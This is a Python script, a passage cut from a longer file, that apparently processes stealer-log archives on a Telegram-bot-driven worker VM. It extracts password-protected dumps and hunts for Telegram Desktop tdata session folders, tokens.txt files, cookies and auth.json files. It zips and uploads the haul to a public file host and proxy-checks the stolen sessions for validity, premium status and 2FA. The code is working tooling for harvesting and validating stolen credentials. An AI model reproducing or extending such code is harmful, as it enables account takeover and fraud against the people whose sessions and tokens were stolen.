                f"🧊 {bold('Frozen')}    {code(len(fro))}  ·  💀 {bold('Dead')}  "
                f"{code(len(dead))}\n"
                f"🌐 {bold('Proxies')}   {code(len(proxies) or 1)} · live feed\n"
                + ship_note(idx, count, size, tot, split, "tdata_report.zip"))
    n_parts, link = ship(zpath, tdcap)
    if link:
        out["tk_link"] = link
    out["tk_zip"] = n_parts > 0
    return out


def find_tokens(roots):
    """Every tokens.txt / token.txt in the extracted trees — Telegram Desktop
    clients drop these next to (or beside) the tdata folders."""
    out = []
    for root in roots:
        try:
            if not root.exists():
                continue
            for p in root.rglob("*"):
                try:
                    if p.is_file() and p.name.lower() in TOKEN_NAMES:
                        out.append(p)
                except OSError:
                    continue
        except OSError:
            continue
    return out

def pack_tokens(files):
    """tokens.zip: each file becomes <the folder it was found in>_file_token.txt,
    duplicates get _2/_3, and found_in.txt maps every name back to its origin
    path inside the archive."""
    if not files:
        return None, 0
    zp = OUT / "tokens.zip"
    manifest, used, total = [], {""}, 0
    base = WORK / "ex"
    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
        for p in files:
            folder = re.sub(r"[^\w.-]", "_", p.parent.name) or "root"
            name, k = "%s_file_token.txt" % folder, 2
            while name.lower() in used:
                name = "%s_file_token_%d.txt" % (folder, k)
                k += 1
            used.add(name.lower())
            try:
                z.write(str(p), name)
            except Exception:
                continue
            try:
                rel = str(p.relative_to(base))
            except Exception:
                rel = str(p)
            manifest.append("%s  <-  %s" % (name, rel))
            total += 1
        if not total:
            zp.unlink(missing_ok=True)
            return None, 0
        z.writestr("found_in.txt",
                   "TOKEN FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
                   ("=" * 48, "\n".join(manifest)))
    return zp, total

def find_json(roots):
    """Every .json in the trees except auth.json (that one has its own flow)."""
    out = []
    for root in roots:
        try:
            if not root or not Path(root).exists():
                continue
            for p in root.rglob("*"):
                try:
                    if p.is_file() and p.name.lower().endswith(".json") \
                            and p.name.lower() != "auth.json":
                        out.append(p)
                except OSError:
                    continue
        except OSError:
            continue
    return out

def pack_json(files):
    """json_files.zip: every JSON with its ORIGINAL name; duplicate names get
    name_#1.json, name_#2.json… found_in.txt maps each to its origin path."""
    if not files:
        return None, 0
    zp = OUT / "json_files.zip"
    used, manifest, total = {"", }, [], 0
    base = WORK / "ex"
    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
        for p in files:
            stem, ext = os.path.splitext(p.name)
            name, k = p.name, 1
            while name.lower() in used:
                name = "%s_#%d%s" % (stem, k, ext)
                k += 1
            try:
                z.write(str(p), name)
            except Exception:
                continue
            used.add(name.lower())
            try:
                rel = str(p.relative_to(base))
            except Exception:
                rel = str(p)
            manifest.append("%s  <-  %s" % (name, rel))
            total += 1
        if not total:
            zp.unlink(missing_ok=True)
            return None, 0
        z.writestr("found_in.txt",
                   "JSON FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
                   ("=" * 48, "\n".join(manifest)))
    return zp, total

def finish(task, stage, **extra):
    """Terminal state for a job: paint the card, report to the bot, back to idle."""
    st(stage, 100 if stage == "done" else _state.get("pct", 0),
       job=task.get("job"), vm=SPECS,
       **{k: extra[k] for k in extra if k in ("err", "tried")})
    payload = {"job": task.get("job"), "stage": stage, "uid": task.get("chat")}
    payload.update({k: extra[k] for k in extra
                    if k in ("err", "found", "cookies", "tried", "sent", "failed",
                             "links", "auth", "auth_sent", "auth_fid", "td_total",
                             "td_parts", "td_via", "tok_total", "tok_parts",
                             "js_total", "js_parts", "tk_total", "tk_valid",
                             "tk_prem", "tk_2fa", "tk_frozen", "tk_dead",
                             "tk_err", "tk_zip", "tk_proxies", "tk_link",
                             "ck_total", "ck_live", "ck_prem", "ck_free",
                             "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies")})
    payload["pubs"] = PB[3]
    report(payload)
    PB[1] = None

def process(task):
    """Run one job inside this long-lived VM."""
    global DOMS, CHAT
    DOMS = [d.lower() for d in task.get("domains") or []]
    CHAT = task.get("chat")
    PB[0], PB[2], PB[3] = 0.0, time.time(), 0
    PB[1] = task.get("msg")
    for junk in list(OUT.glob("*.zip")) + [PROG]:
        try: junk.unlink()
        except Exception: pass
    (OUT / "cancel.flag").unlink(missing_ok=True)
    st("queued", 0, job=task.get("job"), vm=SPECS)
    arc = download(task["url"])
    if arc is None:
        why = _state.get("err") or "aborted"
        if stop():
            finish(task, "cancelled", err="cancelled")
        else:
            finish(task, "error", err=why)
        return
    ok, why = extract(arc, WORK / "ex", task.get("passwords") or [])
    if stop():
        finish(task, "cancelled", err="cancelled"); return
    if not ok:
        tried = len(task.get("passwords") or [])
        if why == "wrong_password":
            finish(task, "wrong_password", tried=tried)
        else:
            finish(task, "error", err=why)
        return
    shutil.rmtree(WORK / "dl", ignore_errors=True) \
        if not (task.get("tdata") or task.get("json")) else None
    packed, auths = search_pack(WORK / "ex", bool(task.get("auth")))
    if stop():
        shutil.rmtree(WORK, ignore_errors=True)
        finish(task, "cancelled", err="cancelled"); return
    sent, failed, links = deliver(packed, task)
    want_auth = bool(task.get("auth"))
    want_tdata = bool(task.get("tdata"))
    auth_sent, auth_fid = deliver_auth(auths) if want_auth else (False, None)
    td_zip, td_total = None, 0
    if want_tdata:
        tdirs = find_tdata(WORK / "ex")
        if not tdirs:
            # the filtered extract skips tdata binaries — pull them now
            st("extract", 45, msg="tdata not in filtered extract — pulling")
            try:
                _extract(arc, WORK / "tdex", task.get("passwords") or [],
                         ["*tdata*"])
            except Exception as e:
                sys.stdout.write("tdex pass: %s\n" % e); sys.stdout.flush()
            tdirs = find_tdata(WORK / "ex") + find_tdata(WORK / "tdex")
        if not tdirs:
            st("extract", 45, msg="full extract to hunt tdata folders")
            try:
                _extract(arc, WORK / "tdfull", task.get("passwords") or [], None)
            except Exception as e:
                sys.stdout.write("tdfull pass: %s\n" % e); sys.stdout.flush()
            tdirs = find_tdata(WORK / "tdfull")
        if not tdirs:
            tdirs = find_tdata(WORK / "ex")   # final sweep, signature rules too
        td_zip, td_total = pack_tdata(tdirs)
    td_parts, td_link, td_via = 0, None, None
    if td_zip:
        td_size = td_zip.stat().st_size
        td_head = (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
                    % (td_total, '' if td_total == 1 else 's')))}\n{THIN}\n"
                   f"🗃 {bold('Folders')}  {code(td_total)}\n"
                   f"📦 {bold('Size')}     {code(fs(td_size))}\n")
        td_tail = (f"🗂 {bold('Layout')}    plain folder trees inside the zip — "
                   f"no zip-in-zip, unzip and use\n"
                   f"🗝 {bold('Manifest')}  found_in.txt shows each origin path\n"
                   f"📎 Sessions, map0/map1 and key files all included.")
        td_link = gofile(str(td_zip))
        if td_link:
            td_parts, td_via = 1, "link"
            new_card(td_head + f"🔓 {bold('Download')} {code(td_link)}\n"
                              f"🌐 {bold('Note')}      one zip, whole tdata set — "
                              f"link works for anyone, not just you\n" + td_tail)
        else:
            # gofile is down — the archive is still worth delivering, so fall back
            # to the chat copy instead of losing the run's tdata work.
            sys.stdout.write("gofile failed for tdata.zip — sending it to chat\n")
            sys.stdout.flush()
            def td_cap(size, idx, count, tot, split):
                return td_head + ship_note(idx, count, size, tot, split, "tdata.zip") + td_tail
            td_parts, td_link = ship(td_zip, td_cap)
            td_via = "chat"
        if td_link:
            links["tdata"] = td_link
    tk = {}
    if want_tdata and task.get("tdatacheck") and tdirs:
        st("queued", 89, job=task.get("job"), vm=SPECS,
           msg="tdata proxy-check starting")
        try:
            tk = check_tdata(tdirs)
        except Exception as e:
            sys.stdout.write("tdcheck crashed: %s\n" % e); sys.stdout.flush()
            tk = {"tk_total": len(tdirs), "tk_valid": 0, "tk_prem": 0,
                  "tk_2fa": 0, "tk_frozen": 0, "tk_dead": 0, "tk_err": len(tdirs),
                  "tk_proxies": 0, "tk_zip": False}
    tok_zip, tok_total = None, 0
    toks = find_tokens([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
    if toks:
        tok_zip, tok_total = pack_tokens(toks)
    tok_parts, tok_link = 0, None
    if tok_zip:
        def tok_cap(size, idx, count, tot, split):
            return (f"{gold_header('TOKEN FILES', esc('%d found' % tok_total))}\n{THIN}\n"
                    f"🎟 {bold('Files')}    {code(tok_total)} × {code('tokens.txt')}\n"
                    f"🏷 {bold('Names')}    {code('<folder it came from>_file_token.txt')}\n"
                    + ship_note(idx, count, size, tot, split, "tokens.zip") +
                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
        tok_parts, tok_link = ship(tok_zip, tok_cap)
        if tok_link:
            links["tokens"] = tok_link
    js_zip, js_total = None, 0
    if task.get("json"):
        st("scan", 44, msg="hunting every .json in the archive")
        jsf = find_json([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
        sys.stdout.write("json hunt 1st pass: %d files\n" % len(jsf))
        sys.stdout.flush()
        if not jsf:
            # the filtered extract only keeps .txt/.log/.cookie/auth.json —
            # pull all the other .json files now; on nested archives the
            # include-mask pass often matches nothing, so a full pass follows
            st("extract", 45, msg="pulling every .json from the archive")
            ok, why = False, "pass_skipped"
            try:
                ok, why = _extract(arc, WORK / "jx",
                                   task.get("passwords") or [], ["*.json"])
                sys.stdout.write("jx incl pass: ok=%s why=%s\n" % (ok, why))
            except Exception as e:
                sys.stdout.write("jx incl pass: %s\n" % e)
            sys.stdout.flush()
            jsf = find_json([WORK / "jx"])
            if not jsf:
                st("extract", 45, msg="full extract to gather every .json")
                try:
                    ok, why = _extract(arc, WORK / "jx",
                                       task.get("passwords") or [], None)
                    sys.stdout.write("jx full pass: ok=%s why=%s\n" % (ok, why))
                except Exception as e:
                    sys.stdout.write("jx full pass: %s\n" % e)
                sys.stdout.flush()
                jsf = find_json([WORK / "jx"])
            sys.stdout.write("json hunt total: %d files\n" % len(jsf))
            sys.stdout.flush()
        js_zip, js_total = pack_json(jsf)
    js_parts, js_link = 0, None
    if js_zip:
        def js_cap(size, idx, count, tot, split):
            return (f"{gold_header('JSON FILES', esc('%d found' % js_total))}\n{THIN}\n"
                    f"🗂 {bold('Files')}    {code(js_total)} × {code('.json')}\n"
                    f"🏷 {bold('Names')}    original names — duplicates become "
                    f"{code('name_#1.json')}, {code('name_#2.json')}\n"
                    + ship_note(idx, count, size, tot, split, "json_files.zip") +
                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
        js_parts, js_link = ship(js_zip, js_cap)
        if js_link:
            links["json"] = js_link
    ck = check_auths(auths) if (want_auth and task.get("authcheck") and auths) else {}
    shutil.rmtree(WORK, ignore_errors=True)
    st("done", 100, job=task.get("job"), vm=SPECS)
    finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
           failed=failed, links=links, auth=len(auths) if want_auth else 0,
           auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None,
           td_total=td_total, td_parts=td_parts, td_via=td_via,
           tok_total=tok_total, tok_parts=tok_parts,
           js_total=js_total, js_parts=js_parts, **tk, **ck)

def main():
    OUT.mkdir(parents=True, exist_ok=True)
    global SPECS
    SPECS = vm_specs()
    try:
        task = json.loads(os.environ.get("TASK") or "{}")
    except Exception:
        task = {}
    if not task.get("url"):
        st("error", err="runner started without a task")
        report({"event": "no_task"})
        return
    st("queued", 0, job=task.get("job"), vm=SPECS)
    process(task)

if __name__ == "__main__":
    main()